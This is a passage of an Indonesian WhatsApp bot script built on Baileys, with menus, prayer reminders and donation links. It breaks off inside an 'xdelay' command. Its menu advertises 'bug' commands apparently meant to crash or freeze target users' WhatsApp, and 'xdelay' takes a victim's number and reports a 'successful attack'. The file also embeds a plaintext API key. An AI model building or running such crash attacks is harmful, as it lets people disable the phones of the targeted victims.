/*
  ⸻⸻〔 𝐂𝐑𝐄𝐃𝐈𝐓 𝐒𝐂𝐑𝐈𝐏𝐓 〕⸻⸻
 ⟢ Base : Syah
 ⟢ Developer : XyZen
 
  SCRIPT INI 100% FREE!!
  LAPOR KE OWNER JIKA ADA YANG MENJUAL SCRIPT INI
 
    [ CONTACT ] 
📎 Telegram: t.me/XyZenXO2
📞 WhatsApp: 6288983105522
  
   REQ FITUR BISA KE
   https://t.me/BokepJpg_bot
  
 Silakan rename kalau mau, tapi ingat:
 Rename trus dijual = mental sampah.
  
 Hapus credit?
Gapapa, tapi entar pas error jangan nangis DM minta tolong.

*/

require('./config')
const { 
  default: baileys, proto, jidNormalizedUser, generateWAMessage, 
  generateWAMessageFromContent, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");

const {
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, 
  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, 
  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, 
  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, 
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, 
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, 
  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, 
  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, 
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, 
  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, 
  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, mentionedJid, processTime, Browser, MessageType, 
  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, 
  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, 
  isBaileys, AnyMessageContent, fetchLatestBaileysVersion, 
  templateMessage, InteractiveMessage, Header 
} = require("@whiskeysockets/baileys");

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const apikey = "8b9768c45dmsh2e573132136cb4fp1caa57jsn4f0f65b568a2";
const crypto = require('crypto')
const cheerio = require('cheerio')
const path = require('path')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const jimp = require("jimp")
const bugres = 'In processs'
const RC = fs.readFileSync('./Bokep.jpeg')
const { SnackVideo } = require('./memory/snackvideo')
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('./system/storage')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, addExif } = require('./system/exif.js')

module.exports = oyin = async (oyin, m, chatUpdate, store) => {
const { from } = m
try {
      
const body = (
    // Pesan teks biasa
    m.mtype === "conversation" ? m.message.conversation :
    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :

    // Pesan media dengan caption
    m.mtype === "imageMessage" ? m.message.imageMessage.caption :
    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
    m.mtype === "documentMessage" ? m.message.documentMessage.caption || "" :
    m.mtype === "audioMessage" ? m.message.audioMessage.caption || "" :
    m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "" :

    // Pesan interaktif (tombol, list, dll.)
    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :

    // Pesan khusus
    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
    m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text :
    m.mtype === "reactionMessage" ? m.message.reactionMessage.text :
    m.mtype === "contactMessage" ? m.message.contactMessage.displayName :
    m.mtype === "contactsArrayMessage" ? m.message.contactsArrayMessage.contacts.map(c => c.displayName).join(", ") :
    m.mtype === "locationMessage" ? `${m.message.locationMessage.degreesLatitude}, ${m.message.locationMessage.degreesLongitude}` :
    m.mtype === "liveLocationMessage" ? `${m.message.liveLocationMessage.degreesLatitude}, ${m.message.liveLocationMessage.degreesLongitude}` :
    m.mtype === "pollCreationMessage" ? m.message.pollCreationMessage.name :
    m.mtype === "pollUpdateMessage" ? m.message.pollUpdateMessage.name :
    m.mtype === "groupInviteMessage" ? m.message.groupInviteMessage.groupJid :
    
    // Pesan satu kali lihat (View Once)
    m.mtype === "viewOnceMessage" ? (m.message.viewOnceMessage.message.imageMessage?.caption || 
                                     m.message.viewOnceMessage.message.videoMessage?.caption || 
                                     "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2" ? (m.message.viewOnceMessageV2.message.imageMessage?.caption || 
                                       m.message.viewOnceMessageV2.message.videoMessage?.caption || 
                                       "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2Extension" ? (m.message.viewOnceMessageV2Extension.message.imageMessage?.caption || 
                                                m.message.viewOnceMessageV2Extension.message.videoMessage?.caption || 
                                                "[Pesan sekali lihat]") :

    // Pesan sementara (ephemeralMessage)
    m.mtype === "ephemeralMessage" ? (m.message.ephemeralMessage.message.conversation ||
                                      m.message.ephemeralMessage.message.extendedTextMessage?.text || 
                                      "[Pesan sementara]") :

    // Pesan interaktif lain
    m.mtype === "interactiveMessage" ? "[Pesan interaktif]" :

    // Pesan yang dihapus
    m.mtype === "protocolMessage" ? "[Pesan telah dihapus]" :

    ""
);
const budy = (typeof m.text == 'string' ? m.text: '')
const prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const Premium = JSON.parse(fs.readFileSync('./database/premium.json'))
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const botNumber = await oyin.decodeJid(oyin.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isDev = owner
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender)
const isPremium = [botNumber, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await oyin.groupMetadata(from).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const groupName = m.isGroup ? groupMetadata.subject : "";
const pushname = m.pushName || "No Name"
const senderNumber = sender.split('@')[0];
// fungsi waktu real time
const moment = require('moment-timezone')
// Ambil waktu Jakarta
const time = moment.tz("Asia/Jakarta").format("HH:mm:ss")
const tanggal = moment.tz("Asia/Jakarta").format("DD/MM/YYYY") // format 12/08/2025
const hari = moment.tz("Asia/Jakarta").format("dddd") // format Senin, Selasa, dst.

const boomExecuted = new Set();

// Ucapan berdasarkan jam
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:59") {
    ucapanWaktu = "🌃 ꜱᴇʟᴀᴍᴀᴛ ᴍᴀʟᴀᴍ"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄 ꜱᴇʟᴀᴍᴀᴛ ꜱᴏʀᴇ"
} else if (time >= "11:00:00" && time < "15:00:00") {
    ucapanWaktu = "🏞️ ꜱᴇʟᴀᴍᴀᴛ ꜱɪᴀɴɢ"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️ ꜱᴇʟᴀᴍᴀᴛ ᴘᴀɢɪ"
} else {
    ucapanWaktu = "🌆 ꜱᴇʟᴀᴍᴀᴛ ꜱᴜʙᴜʜ"
}

oyin.autoshalat = oyin.autoshalat ? oyin.autoshalat : {}
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? oyin.user.id : m.sender
let id = m.chat

if (id in oyin.autoshalat) {
    return false
}

let jadwalSholat = {
    shubuh: '04:50',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '18:16',
    isya: '19:27',
}

const datek = new Date((new Date).toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
const hours = datek.getHours();
const minutes = datek.getMinutes();
const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`

for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        let caption = `Hai kak 👋${pushname},\nWaktu *${sholat}* telah tiba, ambilah air wudhu dan segeralah shalat🙂.\n\n*${waktu}*\n_untuk wilayah Makassar dan sekitarnya._`

        // Kirim dengan tombol (WhatsApp terbaru)
        await oyin.sendMessage(m.chat, {
            text: caption,
            footer: "Sholat Lah Sebelum Di Sholatkan",
            buttons: [
                { buttonId: "Baik", buttonText: { displayText: "✅ Oke, Terima Kasih" }, type: 1 }
            ],
            headerType: 1
        }, { quoted: m })

        // Simpan status untuk mencegah spam
        oyin.autoshalat[id] = [
            setTimeout(async () => {
                delete oyin.autoshalat[m.chat]
            }, 57000)
        ]
    }
}


if (!oyin.public) {
if (!isCreator) return
}

if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#3498db").bold(`⚙️ New Messages`));
console.log(
chalk.bgHex("#FFFFFF").black(
` ╭─ ▢ Date: ${new Date().toLocaleString()} \n` +
` ├─ ▢ Message: ${m.body || m.mtype} \n` +
` ├─ ▢ Sender: ${m.pushname} \n` +
` ╰─ ▢ Number: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#FFFFFF").black(
` ╭─ ▢ Group: ${groupName} \n` +
` ╰─ ▢ GroupJID: ${m.chat}`
)
);
}
console.log();
}

function randomNomor(min, max = null){
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}}

const BenkzjiiBotz = [botNumber, ...owner, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)

//=== TAROH FUNC AMPAS LU DI BAWAH ===

//========= BATAS FUNCTION =============
const fkontak = {
  key: { participant: '0@s.whatsapp.net', remoteJid: 'status@broadcast', fromMe: false, id: 'Halo' },
  message: {
    locationMessage: { name: 'ʜᴀɴɢʏᴏᴅᴏɴ', jpegThumbnail: '' }
  }
};

const zets = {
			key: {
				fromMe: false,
				participant: "0@s.whatsapp.net",
				remoteJid: "status@broadcast"
			},
			message: {
				orderMessage: {
					orderId: "2007",
					thumbnailUrl: 'https://files.catbox.moe/cka2bu.jpg', 
					itemCount: `2007`,
					status: "INQUIRY",
					surface: "CATALOG",
					message: `✧ ʜᴀɴɢʏᴏᴅᴏɴ ᴛᴇᴀᴍ`,
					token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
				}
			},
			contextInfo: {
				mentionedJid: [m.sender],
				forwardingScore: 9999,
				isForwarded: true
			}
		}


oyin.ments = async (text) => {
    return [m.sender];
};

const catalems = {
        key: {
      remoteJid: '0@s.whatsapp.net',
      fromMe: false,
      id: '4B6CE60895B0D5C04D9FF7CB05566293',
      participant: '0@s.whatsapp.net'
    },
    message: {
      stickerPackMessage: {
        name: 'Powered by XyZen',
        stickerPackId: '6793b295-854b-47d3-beea-932fcdb36cf4',
        stickerPackSize: 3,
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        trayIconFileName: '',
        thumbnailUrl: 'https://files.catbox.moe/cka2bu.jpg',
        contextInfo: {}
      }
    }
  };
  
const reaction = async (jidss, emoji) => {
  oyin.sendMessage(jidss, { react: { text: emoji, key: m.key }});
};

const qkontak = {
key: {
participant: `13135550002@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${pushname}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=13135550002:+1 (313) 555-0002\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

let qmsg = m.quoted ? m.quoted : m.message;
let mime = (qmsg?.mimetype || qmsg?.msg?.mimetype) || "";

const namaOrang = m.pushName || "No Name";
const info = `${namaOrang}`;
const pickRandom = (arr) => arr[Math.floor(Math.random() * arr.length)];
//============= COMMAND MENU ==============
switch (command) {

case "bot":
case "menu": {
  const nomor = sender.replace(/@.+/, '');
  let statusUser;

  if (isCreator) {
    statusUser = "Owner";    
  } else if (global.premium.includes(nomor)) {
    statusUser = "Premium";
  } else {
    statusUser = "Free User";
  }
  const menu = `${ucapanWaktu} 
ʜᴀʟʟᴏ ᴋᴀᴋ *${info}* 👋, ᴘᴇʀᴋᴇɴᴀʟᴋᴀɴ ɴᴀᴍᴀ sᴀʏᴀ *${namabot}*, sᴀʏᴀ ᴀᴅᴀʟᴀʜ ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ ʏᴀɴɢ ᴅɪᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴏʟᴇʜ *xʏᴢᴇɴ*,sᴀʏᴀ sɪᴀᴘ ᴍᴇᴍʙᴀɴᴛᴜ ᴍᴜ ᴋᴀᴘᴀɴᴘᴜɴ ᴅᴀɴ ᴅɪᴍᴀɴᴀᴘᴜɴ 🤗
  
╭─「 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 𝗕𝗢𝗧 」
┃☐ ɴᴀᴍᴇ ʙᴏᴛ : ${namabot}
┃☐ ᴅᴇᴠᴇʟᴏᴘᴇʀ : ${namaCreator}
┃☐ ᴠᴇʀsɪᴏɴ : 2.0.0
┃☐ ᴍᴏᴅᴇ : ${oyin.public ? "Public" : "Self"}
┃☐ ᴛʏᴘᴇ : ᴄᴀꜱᴇ
╰──────────────────ヌ

╭─「 𝗜𝗡𝗙𝗢 𝗣𝗘𝗡𝗚𝗚𝗨𝗡𝗔 」
┃☐ ɴᴀᴍᴀ : *${info}*
┃☐ ɴᴏᴍᴇʀ : @${m.sender.split("@")[0]}
┃☐ ꜱᴛᴀᴛᴜꜱ : ${statusUser}
╰──────────────────ヌ
\`JANGAN SPAM/CALL BOT YA KAK😁🙏\``;

  await oyin.sendMessage(m.chat, {
    interactiveMessage: {
      title: menu,
      footer: "© 2025 - WhatsApp Bot",
      thumbnail: "https://files.catbox.moe/tiv58v.jpeg",
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          bottom_sheet: {
            in_thread_buttons_limit: 1,
            divider_indices: [1, 2, 3, 4, 5, 999],
            list_title: "PILIH MENU",
            button_title: "𝑺𝒆𝒍𝒍𝒆𝒄𝒕 𝑩𝒖𝒕𝒕𝒐𝒏"
          }
        }),
        buttons: [
          {
            name: "cta_copy",
            buttonParamsJson: JSON.stringify({
              display_text: "Donate", 
              id: "-",
              copy_code: "https://saweria.co/XyZenSikma"
            })
          },
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: "Allmenu", 
              id: "allmenu"
            })
          },
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: "ThanksTo", 
              id: "tqto"
            })
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "Donlowd Sc", 
              url: "https://raw.githubusercontent.com/xyzenofficial/Hangyodon-Ver2/main/𝑯𝒂𝒏𝒈𝒚𝒐𝒅𝒐𝒏𝑺𝒊𝒎𝒑𝒍𝒆𝑩𝒐𝒕[𝐍𝐨𝐄𝐧𝐜].zip"
            })
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "Contact Owner", 
              url: "https://wa.me/6288983105522"
            })
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "Information Update", 
              url: "https://whatsapp.com/channel/0029VbBfpHDEKyZNL8xyhw24"
            })
          }
        ]
      }
    }
  }, { quoted: qkontak });

  await new Promise(resolve => setTimeout(resolve, 10));

  // kirim sound
  await oyin.sendMessage(m.chat, {
    audio: { url: "https://files.catbox.moe/56c27t.mp3" },
    mimetype: "audio/mpeg",
    ptt: false
  }, { quoted: m });
}
break;
//=======[ ALL MENU ]========
case "allmenu": {
  const menu = `👋 Hai *${info}*  
I'm a WhatsApp *Hangyodon* bot created by *Xyzen*  

━「 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 𝗕𝗢𝗧 」━
 ⌬ ɴᴀᴍᴇ ʙᴏᴛ : ${namabot}
 ⌬ ᴅᴇᴠᴇʟᴏᴘᴇʀ : ${namaCreator}
 ⌬ ᴠᴇʀsɪᴏɴ : 2.0.0
 ⌬ ᴍᴏᴅᴇ : ${oyin.public ? "Public" : "Self"}
 ⌬ ᴛʏᴘᴇ : ᴄᴀꜱᴇ

\`━━「 𝗜𝗡𝗙𝗢 𝗨𝗣𝗗𝗔𝗧𝗘 」━━\`
https://whatsapp.com/channel/0029VbBfpHDEKyZNL8xyhw24
\`━━━━━━━━━━━━━━━━━━━\`

▧ 「 𝗠𝗘𝗡𝗨 𝗚𝗥𝗢𝗨𝗣 」
┃ ▢ ${prefix}ɪɴᴛʀᴏ 
┃ ▢ ${prefix}ʜɪᴅᴇᴛᴀɢ
└───···

▧ 「 𝗠𝗘𝗡𝗨 𝗕𝗨𝗚𝗦𝗦 」
┃ ▢ ${prefix}ʙʟᴀɴᴋ
┃ ▢ ${prefix}xᴅᴇʟᴀʏ
┃ ▢ ${prefix}ғᴏʀᴄʟᴏsᴇ
┃ ▢ ${prefix}sʏsᴛᴇᴍᴜɪ
┃ ▢ ${prefix}ᴅᴇʟᴀʏʜᴀʀᴅ
┃ ▢ ${prefix}ᴄᴀʀᴏᴜꜱᴇʟ
└───···

▧ 「 𝗠𝗘𝗡𝗨 𝗢𝗪𝗡𝗘𝗥 」
┃ ▢ ${prefix}sᴇʟғ  
┃ ▢ ${prefix}ᴘᴜʙʟɪᴄ
┃ ▢ ${prefix}ꜱᴇᴛᴘᴘʙᴏᴛ 
┃ ▢ ${prefix}ᴅᴇʟᴘᴘʙᴏᴛ
┃ ▢ ${prefix}ᴀᴅᴅᴏᴡɴᴇʀ  
┃ ▢ ${prefix}ᴅᴇʟᴏᴡɴᴇʀ
┃ ▢ ${prefix}ᴀᴅᴅᴘʀᴇᴍɪᴜᴍ
┃ ▢ ${prefix}ᴅᴇʟᴘʀᴇᴍɪᴜᴍ  
└───···

▧ 「 𝗠𝗘𝗡𝗨 𝗦𝗧𝗢𝗥𝗘 」
┃ ▢ ${prefix}ʟɪꜱᴛɢᴄ
┃ ▢ ${prefix}ᴘᴀʏ-ᴏᴠᴏ
┃ ▢ ${prefix}ᴘᴀʏ-ᴅᴀɴᴀ
┃ ▢ ${prefix}ᴘᴀʏ-ɢᴏᴘᴀʏ
┃ ▢ ${prefix}ᴀʟʟᴘᴀʏᴍᴇɴᴛ
┃ ▢ ${prefix}ᴘᴜꜱʜᴋᴏɴᴛᴀᴋ1
┃ ▢ ${prefix}ᴘᴜꜱʜᴋᴏɴᴛᴀᴋ2
┃ ▢ ${prefix}ꜱᴀᴠᴇᴋᴏɴᴛᴀᴋ1
┃ ▢ ${prefix}ꜱᴀᴠᴇᴋᴏɴᴛᴀᴋ2
└───···

▧ 「 𝗠𝗘𝗡𝗨 𝗙𝗨𝗡𝗡 」
┃ ▢ ${prefix}ʜᴀᴄᴋ
┃ ▢ ${prefix}ᴄᴏᴄᴏᴋ
┃ ▢ ${prefix}ᴊᴏᴅᴏʜ
┃ ▢ ${prefix}ᴄᴇᴋɢᴀʏ
┃ ▢ ${prefix}ᴀᴘᴀᴋᴀʜ
┃ ▢ ${prefix}ʀᴏᴀꜱᴛɪɴɢ
┃ ▢ ${prefix}ᴘᴀᴘ-ᴏʟɪɴᴇ
┃ ▢ ${prefix}ᴄᴇᴋ-ᴍᴏᴏᴅ
┃ ▢ ${prefix}ꜰᴀᴋᴛᴀ-ᴜɴɪᴋ
┃ ▢ ${prefix}ᴄᴇᴋɢᴀɴᴛᴇɴɢ
┃ ▢ ${prefix}ᴄᴇᴋᴊᴀɴᴛᴀɴ
┃ ▢ ${prefix}ᴄᴇᴋᴋᴏɴᴛᴏʟ
┃ ▢ ${prefix}ᴄᴇᴋɢᴏʙʟᴏᴋ
└───···

▧ 「 𝗠𝗘𝗡𝗨 𝗧𝗢𝗢𝗟𝗦 」
┃ ▢ ${prefix}ʜᴅ
┃ ▢ ${prefix}ʜᴅ2
┃ ▢ ${prefix}ʜᴅ3
┃ ▢ ${prefix}ɪQᴄ
┃ ▢ ${prefix}ɢᴇᴛ
┃ ▢ ${prefix}ᴇɴᴄ
┃ ▢ ${prefix}ʙʀᴀᴛ
┃ ▢ ${prefix}ᴛᴏᴜʀʟ
┃ ▢ ${prefix}ᴛᴏɪᴍɢ
┃ ▢ ${prefix}ʀᴇᴍɪɴɪ
┃ ▢ ${prefix}ᴡᴀɪꜰᴜ
┃ ▢ ${prefix}ʜᴇɴᴛᴀɪ
┃ ▢ ${prefix}ᴍᴇᴛᴀ-ᴀɪ
┃ ▢ ${prefix}ᴛʀᴀᴄᴋ-ɪᴘ
┃ ▢ ${prefix}ᴄᴇᴋɪᴅᴄʜ
┃ ▢ ${prefix}ʀᴇᴀᴄᴛᴄʜ
┃ ▢ ${prefix}ꜱᴘᴀᴍɴɢʟ
┃ ▢ ${prefix}Qᴜᴏᴛᴇ ꜱᴛɪᴄᴋᴇʀ
└───···

▧ 「 𝗠𝗘𝗡𝗨 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 」
┃ ▢ ${prefix}ᴘʟᴀʏ
┃ ▢ ${prefix}ʏᴛᴍᴘ3
┃ ▢ ${prefix}ʏʏᴍᴘ4
┃ ▢ ${prefix}ᴛɪᴋᴛᴏᴋ
┃ ▢ ${prefix}ᴛɪᴋᴛᴏᴋ2
┃ ▢ ${prefix}ᴄᴀᴘᴄᴜᴛ
┃ ▢ ${prefix}ɢɪᴛᴄʟᴏɴᴇ
┃ ▢ ${prefix}ᴘɪɴᴛᴇʀᴇꜱᴛ 
┃ ▢ ${prefix}ᴍᴇᴅɪᴀꜰɪʀᴇ
┃ ▢ ${prefix}ɪɴꜱᴛᴀɢʀᴀᴍ
┃ ▢ ${prefix}ꜱɴᴀᴄᴋᴠɪᴅɪᴏ
└───···
`;

  await oyin.sendMessage(m.chat, {
    interactiveMessage: {
      title: menu,
      footer: "© 2025 - WhatsApp Bot",
      thumbnail: "https://files.catbox.moe/3ncxbf.jpg",
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          bottom_sheet: {
            in_thread_buttons_limit: 7,
            divider_indices: [1, 2, 3, 4, 5, 999],
            list_title: "𝑻𝒉𝒆 𝑬𝒕𝒆𝒓𝒏𝒂𝒍 𝑮𝒉𝒐𝒔𝒕",
            button_title: "𝑺𝒆𝒍𝒍𝒆𝒄𝒕 𝑩𝒖𝒕𝒕𝒐𝒏"
          }
        }),
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "DONATE", 
              url: "https://saweria.co/XyZenSikma"
            }) 
          },         
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: "THANKS TO", 
              id: "tqto"
            })
          }
        ]
      }
    }
  }, { quoted: catalems });

  await new Promise(resolve => setTimeout(resolve, 10));

  // kirim sound
  await oyin.sendMessage(m.chat, {
    audio: { url: "https://files.catbox.moe/56c27t.mp3" }, 
    mimetype: "audio/mpeg",
    ptt: false
  }, { quoted: catalems });
}
break;
//============= TQTO ==============
case "tqto": {
  const tqto = `\`「 𝐇𝐀𝐍𝐆𝐘𝐎𝐃𝐎𝐍 - 𝟐𝟎𝟐𝟓 」\`
   =☐ᴀʟʟᴀʜ ꜱᴡᴛ » ᴍʏ ɢᴏᴅ
   =☐ꜱʏᴀʜ » ʙᴀꜱᴇ ʙᴏᴛ
   =☐xʏᴢᴇɴ » ᴅᴇᴠᴇʟᴏᴘᴇʀ
   =☐ʀᴀᴢᴢx » ꜱᴜᴘᴘᴏʀᴛ
   =☐ᴋᴀʏᴢᴜ » ꜱᴜᴘᴘᴏʀᴛ
   =☐ꜱʏᴀʟʟ » ꜱᴜᴘᴘᴏʀᴛ
   =☐ʟᴀɴɢᴢᴢ » ꜱᴜᴘᴘᴏʀᴛ
   =☐ɴᴜɢɢᴇᴛ » ꜱᴜᴘᴘᴏʀᴛ
   =☐ᴋɪɴᴢᴢx » ʙᴇꜱᴛ ꜰʀɪᴇɴᴅ
   =☐ʙᴀʏᴜ » ʙᴇꜱᴛ ꜰʀɪᴇɴᴅ
   =☐ʟᴀɴᴢᴢ » ʙᴇꜱᴛ ꜰʀɪᴇɴᴅ
   =☐ᴀʟʟ ᴛᴇᴀᴍ ʜᴀɴɢʏᴏᴅᴏɴ
\`━━━━━━━━━━━━━━━━━━━\`
💬 _“Terima kasih untuk setiap nama di daftar ini—_
_kalian tidak hanya membantu,_
_tapi juga bertahan di sisi ketika yang lain memilih pergi.”_
`;

  await oyin.sendMessage(m.chat, {
    interactiveMessage: {
      title: tqto,
      footer: "Hangyodon X-Team",
      thumbnail: "https://files.catbox.moe/cka2bu.jpg",
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          bottom_sheet: {
            in_thread_buttons_limit: 4,
            divider_indices: [1, 2, 3, 4, 5, 999],
            list_title: "PILIH MENU",
            button_title: "𝑺𝒆𝒍𝒍𝒆𝒄𝒕 𝑩𝒖𝒕𝒕𝒐𝒏"
          }
        }),
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "DONATE", 
              url: "https://saweria.co/XyZenSikma"
            })
          },
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: "BACK TO MENU", 
              id: "menu"
            })
          }
        ]
      }
    }
  }, { quoted: zets });

  await new Promise(resolve => setTimeout(resolve, 10));

  // kirim sound
  await oyin.sendMessage(m.chat, {
    audio: { url: "https://files.catbox.moe/0g3xcm.mp3" }, 
    mimetype: "audio/mpeg",
    ptt: false
  }, { quoted: m });
}
break;
//===
case 'script': {
let teks =`👋 Hallo kak *${info}*
\`Ingin menggunakan Script ini??\`
\`Silahkan Donlowd di sini 👇\`

https://raw.githubusercontent.com/xyzenofficial/Hangyodon-Ver2/main/𝑯𝒂𝒏𝒈𝒚𝒐𝒅𝒐𝒏𝑺𝒊𝒎𝒑𝒍𝒆𝑩𝒐𝒕[𝐍𝐨𝐄𝐧𝐜].zip

\`Jangan Lupa Mampir ke Channel kami👇\`
https://whatsapp.com/channel/0029VbBfpHDEKyZNL8xyhw24

\`\`\`Support Terus Channel kami agar script ini terus berkembang✨\`\`\``;
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
   message: {
       "messageContextInfo": {
         "deviceListMetadata": {},
         "deviceListMetadataVersion": 2
       },
       interactiveMessage: proto.Message.InteractiveMessage.create({
         body: proto.Message.InteractiveMessage.Body.create({
           text: teks
         }),
         footer: proto.Message.InteractiveMessage.Footer.create({
           text: "© 2025 - Hangyodon"
         }),
         header: proto.Message.InteractiveMessage.Header.create({
           hasMediaAttachment: true,
         ...(await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/cka2bu.jpg" } }, { upload: oyin.waUploadToServer }))}),
         nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
           buttons: [
             {
                "name": "cta_url",
                "buttonParamsJson": `{\"display_text\":\"Room publik\",\"url\":\"https://t.me/PublikXyzenSikma\",\"merchant_url\":\"https://www.google.com\"}`
             },
             {
                "name": "cta_url",
                "buttonParamsJson": `{\"display_text\":\"Contact Owner\",\"url\":\"https://t.me/XyZenXO2\",\"merchant_url\":\"https://www.google.com\"}`
             }
          ],
         })
       })
   }
 }
}, {})

await oyin.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
}
break
//CASE BUG 
 case 'xdelay': {
  if (!isCreator) 
    return m.reply('*[Akses Ditolak!!]*\n𝙵𝙸𝚃𝚄𝚁 𝙺𝙷𝚄𝚂𝚄𝚂 𝙿𝚁𝙴𝙼𝙸𝚄𝙼‼️');
    
  if (!q) 
    return m.reply(`⚠️ *Example:* ${command} 62xxxx`);

  let pepec = q.replace(/[^0-9]/g, "");
  let target = pepec + '@s.whatsapp.net';

  m.reply(`\`𝗢𝗗𝗢𝗡 𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚\`
ᴛʏᴘᴇ : xᴅᴇʟᴀʏ
ᴛᴀʀɢᴇᴛ : ${target}
ꜱᴛᴀᴛᴜꜱ : 𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕 𝚊𝚝𝚝𝚊𝚌𝚔`);

